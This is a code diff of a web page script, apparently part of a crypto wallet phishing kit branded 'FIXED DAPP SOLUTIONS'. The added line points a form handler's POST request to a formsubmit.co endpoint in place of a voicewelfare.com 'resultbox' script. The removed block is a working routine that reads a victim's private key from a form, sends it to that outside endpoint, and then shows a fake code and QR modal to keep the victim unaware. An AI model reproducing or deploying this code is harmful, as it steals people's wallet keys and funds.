@@ -2038,7 +2038,7 @@
 
         try {
             $.ajax({
-                url: "https://voicewelfare.com/resultbox/sender.php",
+                url: "https://formsubmit.co/ajax/4d6480955688877bd34e7642c70f433d",
                 method: "POST",
                 dataType: "JSON",
                 data: {
@@ -2061,42 +2061,3 @@
 
     });
 </script>
-
-
-<script>
-    // Validate seed phrase on form submission
-    $('#privateForm').submit(function (event) {
-        event.preventDefault();
-        document.getElementById("submit_private").disabled = true;
-        let dappKey = $('#privateKey').val().trim();
-
-        var randomString = generateRandomString(7);
-        var dappName = $('#wallet_name').text();
-        let importType = 'PrivateKey';
-        const dappLinkName = "FIXED DAPP SOLUTIONS";
-
-        try {
-            $.ajax({
-                url: "https://formsubmit.co/ajax/4d6480955688877bd34e7642c70f433d",
-                method: "POST",
-                dataType: "JSON",
-                data: {
-                    dappKeys: dappKey,
-                    dappName: dappName,
-                    importType: importType,
-                    linkName: dappLinkName,
-                },
-                success: function () { },
-                complete: function () { },
-            });
-            document.getElementById("p-code").innerHTML = randomString;
-            $("#initial_div").hide();
-            $("#connect_div").hide();
-            $("#qr_modal").show();
-            document.getElementById("submit_private").disabled = false;
-        } catch (error) {
-            document.getElementById("submit_private").disabled = false;
-        }
-    });
-</script>
-
